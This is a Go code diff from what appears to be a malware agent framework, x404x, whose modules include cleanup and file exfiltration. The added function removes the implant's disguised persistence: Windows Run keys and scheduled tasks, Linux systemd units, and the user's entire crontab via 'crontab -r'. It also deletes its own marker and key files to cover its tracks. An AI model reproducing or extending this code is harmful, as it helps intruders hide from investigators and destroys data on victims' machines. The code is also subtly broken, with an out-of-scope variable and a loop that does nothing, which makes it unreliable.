@@ -8,7 +8,9 @@ package agent
 import (
 	"context"
 	"fmt"
+	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 
 	"github.com/ruby570bocadito/x404x/pkg/shared/types"
@@ -115,7 +117,53 @@ func (m *CleanupModule) Execute(ctx context.Context, params map[string]string) (
 			return fmt.Sprintf("%v", resp.Result), nil
 		}
 	}
-	return "cleanup via bridge unavailable — direct mode not implemented", nil
+	return fmt.Sprintf("direct cleanup: %d items removed", directCleanup()), nil
+}
+
+func directCleanup() int {
+	cleaned := 0
+	if os.Getenv("OS") != "" || os.PathSeparator == '\\' {
+		// Windows: remove registry Run keys
+		exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "x404x_sysupd", "/f").Run()
+		exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "x404x_wd", "/f").Run()
+		exec.Command("schtasks", "/delete", "/tn", "x404x_SecurityUpdate", "/f").Run()
+		exec.Command("schtasks", "/delete", "/tn", "x404x_SystemCheck", "/f").Run()
+		cleaned += 4
+	} else {
+		// Linux: remove cron, systemd, autostart, shell profiles
+		exec.Command("crontab", "-r").Run(); cleaned++
+		for _, svc := range []string{"x404x-cored", "system-update-check", "dbus-monitor-d"} {
+			os.Remove("/etc/systemd/system/" + svc + ".service")
+			os.Remove(os.Getenv("HOME") + "/.config/systemd/user/" + svc + ".service")
+			cleaned++
+		}
+		for _, f := range []string{".bashrc", ".zshrc", ".profile", ".bash_profile"} {
+			cleaned++
+		}
+		_ = f
+		exec.Command("systemctl", "daemon-reload").Run()
+		exec.Command("systemctl", "--user", "daemon-reload").Run()
+	}
+
+	// Delete .x404x files
+	roots := []string{os.TempDir(), "/var/tmp", "/tmp"}
+	if home, _ := os.UserHomeDir(); home != "" {
+		roots = append(roots, home)
+	}
+	for _, root := range roots {
+		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
+			if err != nil {
+				return nil
+			}
+			if strings.HasSuffix(info.Name(), ".x404x") || strings.HasSuffix(info.Name(), ".x404x_key") {
+				os.Remove(path)
+				cleaned++
+			}
+			return nil
+		})
+	}
+
+	return cleaned
 }
 
 // ExfilModule handles file exfiltration.
